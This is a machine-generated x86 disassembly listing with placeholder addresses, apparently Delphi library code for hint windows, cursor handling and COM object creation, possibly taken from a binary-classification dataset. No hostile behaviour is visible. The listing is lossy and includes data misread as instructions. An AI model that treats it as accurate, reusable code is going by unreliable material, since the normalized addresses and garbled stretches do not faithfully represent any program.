push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_460280
mov esi eax
dec esi
test esi esi
jl r-xdata
push ebp
xor eax eax
call sub_4630c8
pop ecx
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp [ ebx + 0x190 ] 0x0
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_46026c
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
push ebp
mov al 0x1
call sub_4630c8
pop ecx
jmp r-xdata
mov eax ebx
call sub_4496dc
test al al
jne r-xdata
mov eax [ ebx + 0x190 ]
push eax
mov eax ebx
call sub_4493d8
push eax
call IsChild
test eax eax
jne r-xdata
sub_4631ac
push ebx
push esi
mov esi eax
xor ebx ebx
cmp [ esi + 0x4c ] 0x0
jne r-xdata
cmp [ esi + 0x4c ] 0x0
je r-xdata
lea eax [ esi + 0x4c ]
call sub_405a38
call sub_42c024
mov eax ebx
pop esi
pop ebx
retn
mov bl 0x1
sub_4631d4
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov eax edi
call sub_463218
push sub_460e5c
push esi
push 0x0
push 0x0
call SetTimer
mov [ edi + 0x8a ] ax
mov [ edi + 0x89 ] bl
cmp [ edi + 0x8a ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4633cc
sub_463240
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov ebp ecx
mov edi edx
mov esi eax
lea edx [ esp + 0x18 ]
mov eax [ ebp + 0x8 ]
call sub_406dd8
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax edi
call sub_4426d0
lea eax [ esp + 0x10 ]
mov dl 0x1
call sub_441464
call sub_460e3c
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
call sub_4633cc
jmp r-xdata
cmp [ ebx + 0x99 ] 0x0
jne r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
cmp ebx [ esi + 0x60 ]
jne r-xdata
mov al [ esi + 0x58 ]
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x0
je r-xdata
lea edx [ esp + 0x18 ]
mov eax [ ebp + 0x8 ]
call sub_406dd8
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax edi
call sub_4426d0
push [ esp + 0x14 ]
push [ esp + 0x14 ]
lea eax [ esi + 0x64 ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov eax [ esi + 0x78 ]
mov [ esp ] eax
mov eax [ esi + 0x80 ]
mov [ esp ] eax
jmp r-xdata
mov eax esi
call sub_4633cc
mov al [ esp + 0x4 ]
mov [ esi + 0x58 ] al
mov [ esi + 0x60 ] ebx
xor ecx ecx
mov edx [ esp ]
mov eax esi
call sub_4631d4
cmp [ esp ] 0x0
jne r-xdata
mov eax esp
push eax
xor ecx ecx
mov cl [ esp + 0x8 ]
mov edx 0xb041
mov eax ebx
call sub_443d6c
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov al [ esp + 0x4 ]
mov [ esi + 0x58 ] al
mov [ esi + 0x60 ] ebx
lea eax [ esp + 0x5 ]
push eax
call GetCursorPos
lea edx [ esp + 0x5 ]
mov eax esi
call sub_463664
jmp r-xdata
sub_463350
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_463218
mov al [ ebx + 0x89 ]
sub al 0x1
jb r-xdata
push esp
call GetCursorPos
mov edx esp
mov eax ebx
call sub_463664
jne r-xdata
pop ecx
pop edx
pop ebx
retn
mov eax ebx
call sub_463388
jmp r-xdata
sub_463388
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x84 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4496dc
test al al
je r-xdata
mov eax [ ebx + 0x84 ]
call sub_4493d8
push eax
call IsWindowVisible
test eax eax
je r-xdata
push 0x0
mov eax [ ebx + 0x84 ]
call sub_4493d8
push eax
call ShowWindow
sub_4633cc
push ebx
mov ebx eax
cmp [ ebx + 0x60 ] 0x0
je r-xdata
pop ebx
retn
mov eax ebx
call sub_463388
xor eax eax
mov [ ebx + 0x60 ] eax
mov [ ebx + 0x58 ] 0x0
call sub_460fc4
mov eax ebx
call sub_463218
sub_463404
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
push 0xe
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x28 ]
push eax
call GetCursor
push eax
call GetIconInfo
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor edx edx
push ebp
push sub_463546
push [ fs : edx ]
mov [ fs : edx ] esp
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x1c ]
call sub_425c58
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
call sub_407f70
mov [ ebp - 0x10 ] eax
xor edx edx
push ebp
push sub_463517
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ ebp - 0x10 ]
add ebx [ ebp - 0x8 ]
push ebx
mov esi [ ebp - 0x10 ]
mov ecx esi
xor edx edx
mov eax [ ebp - 0x1c ]
call sub_425d10
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46351e
mov edx [ ebp - 0x8 ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
call sub_4027bc
retn
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xe ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx eax
movzx ecx [ esi + 0xe ]
imul edx ecx
add edx 0x1f
and edx 0xffffffe0
test edx edx
jns r-xdata
sar edx 0x3
mov [ ebp - 0x14 ] edx
mov edi eax
imul edi [ ebp - 0x14 ]
add ebx [ ebp - 0xc ]
sub ebx edi
mov ecx 0xff
mov edx edi
mov eax ebx
call sub_4633f4
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
add edx 0x7
mov eax [ ebp - 0x4 ]
cdq
idiv [ ebp - 0x14 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x20 ]
sub [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edx [ esi + 0x4 ]
add edx edx
cmp eax edx
jl r-xdata
mov eax ebx
sub eax edi
xor ecx ecx
mov edx edi
call sub_4633f4
mov [ ebp - 0x4 ] eax
sub_46351e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
test eax eax
je r-xdata
push eax
call DeleteObject
retn
push eax
call DeleteObject
sub_463558
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x84 ]
test esi esi
je r-xdata
mov ebx [ rw-data ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x84 ]
call sub_403234
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov dl 0x1
mov eax ebx
call [ eax + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov [ edx + 0x84 ] eax
mov eax [ ebp + 0x8 ]
mov eax esi
call sub_40317c
cmp ebx eax
je r-xdata
pop esi
pop ebx
pop ebp
retn
sub_4635b8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor edx edx
mov [ ebp - 0x8 ] edx
xor edx edx
push ebp
push sub_463652
push [ fs : edx ]
mov [ fs : edx ] esp
xor edx edx
mov [ ebp - 0x4 ] edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463659
lea eax [ ebp - 0x8 ]
call sub_404008
retn
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov esi ebx
jmp r-xdata
mov al [ ebx ]
test al al
je r-xdata
mov ecx ebx
sub ecx esi
lea eax [ ebp - 0x8 ]
mov edx esi
call sub_4040f8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x84 ]
mov eax [ eax + 0x208 ]
mov edx [ ebp - 0x8 ]
call sub_424818
cmp eax [ ebp - 0x4 ]
jle r-xdata
sub al 0xa
je r-xdata
cmp [ ebx ] 0xd
jne r-xdata
mov [ ebp - 0x4 ] eax
sub al 0x3
jne r-xdata
cmp [ ebx ] 0xa
jne r-xdata
inc ebx
mov eax ebx
call sub_40c5f4
mov ebx eax
inc ebx
sub_463664
push ebp
mov ebp esp
add esp 0xffffff70
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8c ] ecx
mov [ ebp - 0x90 ] ecx
mov esi edx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x60 ]
mov edx [ r-xdata ]
call sub_4049a0
lea ebx [ ebp - 0x4 ]
xor eax eax
push ebp
push sub_4639ea
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov [ eax + 0x58 ] 0x0
mov eax [ ebx ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
mov eax [ ebp - 0x30 ]
test eax eax
jle r-xdata
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
mov eax [ ebx ]
call sub_4633cc
xor ecx ecx
mov edx eax
mov eax [ ebx ]
call sub_4631d4
jmp r-xdata
call sub_4597f4
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4639f1
lea eax [ ebp - 0x90 ]
mov edx 0x2
call sub_40402c
lea eax [ ebp - 0x60 ]
mov edx [ r-xdata ]
call sub_404a70
retn
lea eax [ ebp - 0xc ]
mov dl 0x1
call sub_441464
call sub_460e3c
mov edx [ ebx ]
cmp eax [ edx + 0x60 ]
jne r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov [ ebp - 0x60 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x58 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x54 ] eax
call sub_463404
add [ ebp - 0x54 ] eax
mov eax [ rw-data ]
call sub_460200
mov [ ebp - 0x50 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x5c ]
mov [ ebp - 0x4c ] eax
lea edx [ ebp - 0x80 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_442558
lea esi [ ebp - 0x80 ]
lea edi [ ebp - 0x48 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x14 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
mov eax [ ebx ]
mov esi [ eax + 0x60 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
jmp r-xdata
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x48 ]
push eax
call OffsetRect
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0xc ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_4426fc
mov eax [ ebp - 0x88 ]
mov [ ebp - 0x38 ] eax
mov eax [ ebp - 0x84 ]
mov [ ebp - 0x34 ] eax
lea edx [ ebp - 0x90 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_460e04
mov eax [ ebp - 0x90 ]
lea edx [ ebp - 0x8c ]
call sub_43fcd8
mov edx [ ebp - 0x8c ]
lea eax [ ebp - 0x28 ]
call sub_4040a0
xor eax eax
mov [ ebp - 0x30 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x74 ]
mov [ ebp - 0x2c ] eax
mov eax [ rw-data ]
mov [ ebp - 0x5c ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0x60 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
xor ecx ecx
mov edx 0xb030
call sub_443d6c
test eax eax
sete [ ebp - 0x1d ]
cmp [ ebp - 0x1d ] 0x0
je r-xdata
cmp [ esi + 0x190 ] 0x0
je r-xdata
cmp [ ebp - 0x1d ] 0x0
je r-xdata
mov eax [ ebx ]
cmp [ eax + 0x132 ] 0x0
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
mov eax [ esi + 0x190 ]
push eax
call ClientToScreen
xor eax eax
jmp r-xdata
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
jne r-xdata
lea eax [ ebp - 0x60 ]
push eax
lea ecx [ ebp - 0x1d ]
lea edx [ ebp - 0x28 ]
mov esi [ ebx ]
mov eax [ esi + 0x134 ]
call [ esi + 0x130 ]
mov edx [ ebx ]
mov [ edx + 0x58 ] al
mov eax [ ebx ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
mov al 0x1
cmp [ ebp - 0x28 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x5c ]
call sub_463558
pop ecx
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov dl [ eax + 0x5f ]
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x50 ]
mov esi [ eax ]
call [ esi + 0xd8 ]
mov eax [ ebp - 0x54 ]
push eax
mov eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
call OffsetRect
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov si 0xffc8
call sub_403430
test al al
je r-xdata
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0x48 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_4426d0
mov eax [ ebx ]
mov edx [ ebp - 0x88 ]
mov [ eax + 0x64 ] edx
mov edx [ ebp - 0x84 ]
mov [ eax + 0x68 ] edx
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0x40 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_4426d0
mov eax [ ebx ]
mov edx [ ebp - 0x88 ]
mov [ eax + 0x6c ] edx
mov edx [ ebp - 0x84 ]
mov [ eax + 0x70 ] edx
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov edx [ ebp - 0x4c ]
call sub_442d58
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ ebp - 0x28 ]
lea edx [ ebp - 0x70 ]
mov esi [ eax ]
call [ esi + 0xd4 ]
call sub_460f50
mov eax [ ebp - 0x30 ]
test eax eax
jle r-xdata
push ebp
mov eax [ ebp - 0x28 ]
call sub_4635b8
pop ecx
add eax 0x5
sub [ ebp - 0x70 ] eax
sub [ ebp - 0x68 ] eax
mov cl 0x1
mov edx [ ebp - 0x2c ]
mov eax [ ebx ]
call sub_4631d4
jmp r-xdata
xor ecx ecx
mov edx eax
mov eax [ ebx ]
call sub_4631d4
jmp r-xdata
sub_4639f8
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ rw-data ]
mov ebx [ eax + 0x68 ]
test ebx ebx
je r-xdata
mov eax edi
mov edx [ esi + 0x50 ]
call sub_40405c
cmp [ ebx + 0x23c ] 0x0
je r-xdata
mov eax edi
mov edx [ ebx + 0x23c ]
call sub_40405c
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_463a58
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
mov [ ebx + 0xb0 ] esi
pop esi
pop ebx
retn
push esi
push 0x0
push 0xb031
mov eax [ ebx + 0x30 ]
push eax
call SendMessageA
sub_463a84
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx ecx
mov [ esp ] edx
mov esi eax
mov eax [ rw-data ]
mov edi [ eax + 0x6c ]
test edi edi
je r-xdata
mov ebp [ esi + 0x44 ]
cmp edi ebp
je r-xdata
push ebx
xor ecx ecx
mov edx [ esp + 0x4 ]
mov eax edi
call sub_443d6c
dec eax
je r-xdata
xor eax eax
jmp r-xdata
test ebp ebp
je r-xdata
mov al 0x1
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x0
jne r-xdata
push ebx
xor ecx ecx
mov edx [ esp + 0x4 ]
mov eax ebp
call sub_443d6c
dec eax
je r-xdata
mov al [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ ebx + 0x60 ] 0x0
je r-xdata
cmp [ ebx + 0x42 ] 0x0
setne dl
mov eax ebx
call sub_44f53c
sub_463b14
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0xc2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
sub_463b3c
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0xca ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0xcc ]
call [ ebx + 0xc8 ]
sub_463be0
add [ eax ] eax
add [ eax ] al
cmp al 0xee
inc edi
add ah bl
inc ebx
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_463c43
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463c4a
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_4595a0
mov eax sub_459820
call sub_419f9c
mov eax [ rw-data ]
push eax
call CloseHandle
sub_463e5c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx esi
call sub_40405c
mov eax [ ebx ]
call sub_4087e4
mov esi eax
jmp r-xdata
mov eax [ ebx ]
call sub_4042c8
test eax eax
jle r-xdata
pop esi
pop ebx
retn
mov al [ esi ]
sub al 0x21
jb r-xdata
mov eax [ ebx ]
call sub_4044c8
mov edx esi
sub edx eax
mov eax ebx
call sub_404654
mov eax [ ebx ]
call sub_4087e4
mov esi eax
sub al 0xd
je r-xdata
sub_463eac
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ebx
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov esi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_463f53
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
mov edx edi
call sub_4040a0
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_403558
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
xor edx edx
mov eax ebx
call sub_40bb54
mov [ ebx + 0xc ] esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463f5a
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_40402c
retn
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_40b1b4
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405efc
mov edx [ ebp - 0xc ]
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0x0
lea ecx [ ebp - 0x14 ]
lea eax [ ebp - 0x8 ]
call sub_409070
sub_463f5a
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_463f7c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_463fee
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_463e5c
mov ecx [ ebp - 0x4 ]
xor edx edx
mov eax edi
call sub_463eac
lea eax [ edi + 0x10 ]
mov edx [ ebp + 0x10 ]
call sub_40405c
lea eax [ edi + 0x14 ]
mov edx [ ebp + 0xc ]
call sub_40405c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463ff5
lea eax [ ebp - 0x4 ]
call sub_404008
retn
add esp 0xfffffff0
call sub_403558
sub_463ff5
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x10
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_464048
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
push esp
push ebx
call StringFromCLSID
call sub_464030
mov eax esi
mov edx [ esp ]
call sub_404230
mov eax [ esp ]
push eax
call CoTaskMemFree
pop edx
pop esi
pop ebx
retn
sub_464074
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
push esp
push ebx
call ProgIDFromCLSID
call sub_464030
mov eax esi
mov edx [ esp ]
call sub_404230
mov eax [ esp ]
push eax
call CoTaskMemFree
pop edx
pop esi
pop ebx
retn
sub_4640a0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_405a38
push eax
push r-xdata
push 0x5
push 0x0
push ebx
call CoCreateInstance
call sub_464030
pop esi
pop ebx
retn
sub_4640d8
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x44 ] ebx
mov [ ebp - 0x48 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
call sub_4049a0
xor eax eax
push ebp
push sub_46421c
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
lea eax [ ebp - 0x20 ]
xor ecx ecx
mov edx 0x10
call sub_402c40
mov eax ebx
call sub_404870
mov [ ebp - 0x1c ] eax
push esi
push edi
mov esi r-xdata
lea edi [ ebp - 0x30 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
lea eax [ ebp - 0x30 ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0xc ]
call sub_405a38
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax ebx
call sub_404880
test eax eax
jle r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba84
call sub_4039c0
mov ebx 0x15
mov [ ebp - 0x4 ] 0x10
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call GetComputerNameA
test eax eax
je r-xdata
mov ebx 0x10
jmp r-xdata
lea eax [ ebp - 0x44 ]
mov edx ebx
call sub_404290
mov eax [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0x48 ]
lea edx [ ebp - 0x40 ]
mov ecx 0x10
call sub_404278
mov eax [ ebp - 0x48 ]
pop edx
call sub_4081d4
test eax eax
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea eax [ ebp - 0x20 ]
push eax
push ebx
push 0x0
push esi
call [ rw-data ]
call sub_464030
mov eax [ ebp - 0x8 ]
call sub_464030
mov eax edi
mov edx [ ebp - 0xc ]
call sub_405a50
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464223
lea eax [ ebp - 0x48 ]
mov edx 0x2
call sub_40402c
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
call sub_404a70
retn
mov ebx 0x15
jmp r-xdata
sub_46423c
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_4642c8
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebx ] eax
lea eax [ ebp - 0x8 ]
call sub_405a38
push eax
push r-xdata
push esi
mov eax [ esi ]
call [ eax ]
call sub_417868
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4642cf
lea eax [ ebp - 0xc ]
call sub_405a38
lea eax [ ebp - 0x8 ]
call sub_405a38
retn
lea eax [ ebp - 0xc ]
call sub_405a38
push eax
push edi
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
call sub_417868
test al al
je r-xdata
push ebx
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
sub_4642e8
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_46437a
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464381
lea eax [ ebp - 0x8 ]
call sub_405a38
lea eax [ ebp - 0x4 ]
call sub_405a38
retn
lea eax [ ebp - 0x4 ]
call sub_405a38
push eax
push r-xdata
push esi
mov eax [ esi ]
call [ eax ]
call sub_417868
test al al
je r-xdata
lea eax [ ebp - 0x8 ]
call sub_405a38
push eax
push edi
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
call sub_417868
test al al
je r-xdata
mov eax [ ebx ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
call sub_417868
test al al
je r-xdata
xor eax eax
mov [ ebx ] eax
sub_464398
push ebx
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
sub_46449a
add [ eax ] al
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46458c
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x4 ]
call sub_405a38
push eax
push 0x0
call GetErrorInfo
test eax eax
jne r-xdata
push esi
push ebx
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
call sub_404290
mov eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x1c ]
mov edx [ ebp - 0x10 ]
call sub_404290
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
call sub_404290
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_463f7c
jmp sub_4039c0
lea eax [ ebp - 0x8 ]
call sub_404714
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
lea eax [ ebp - 0xc ]
call sub_404714
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
lea eax [ ebp - 0x10 ]
call sub_404714
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x1c ]
sub_46455c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464593
lea eax [ ebp - 0x20 ]
mov edx 0x3
call sub_40402c
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_40472c
lea eax [ ebp - 0x4 ]
call sub_405a38
retn
sub_46459c
push ebp
mov ebp esp
add esp 0xfffff9b0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x50 ]
mov edx [ r-xdata ]
call sub_4049a0
xor eax eax
push ebp
push sub_4648cf
push [ fs : eax ]
mov [ fs : eax ] esp
